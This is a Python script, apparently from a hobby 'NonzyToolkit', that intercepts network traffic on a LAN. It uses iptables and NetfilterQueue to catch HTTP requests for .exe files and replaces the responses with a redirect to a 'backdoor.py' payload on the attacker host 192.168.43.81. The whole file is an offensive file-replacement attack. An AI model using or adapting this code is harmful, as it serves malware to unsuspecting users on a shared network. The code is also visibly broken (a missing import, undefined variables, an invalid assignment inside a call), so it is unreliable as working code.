#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

flush_iptable = "iptables --flush"
subprocess.call([flush_iptable])

iptables_rule1 = "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
subprocess.call([iptables_rule1])

iptables_rule2 = "iptables -I INPUT -j NFQUEUE --queue-num 0"
subprocess.call([iptables_rule2])

iptables_rule3 = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
subprocess.call([iptables_rule3])

ack_list = []
def set_load(packet,load):
	packet[scapy.Raw].load = load
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 10000:
			if "exe" in scapy_packet[scapy.Raw].load and "192.168.43.81" not in scapy_packet[scapy.Raw].load:
				print colored("Download Request >>>", "yellow")
				ack_list.append(scapy_packet[scapy.TCP].ack)

		elif scapy_packet[scapy.TCP].sport == 10000:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print colored("Replacing file >>>", "green")
				modified_packet = set_load(scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.43.81/payloads/backdoor.py\n\n")

				packet.set_payload(str(scapy_packet))
		
	packet.accept()

	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()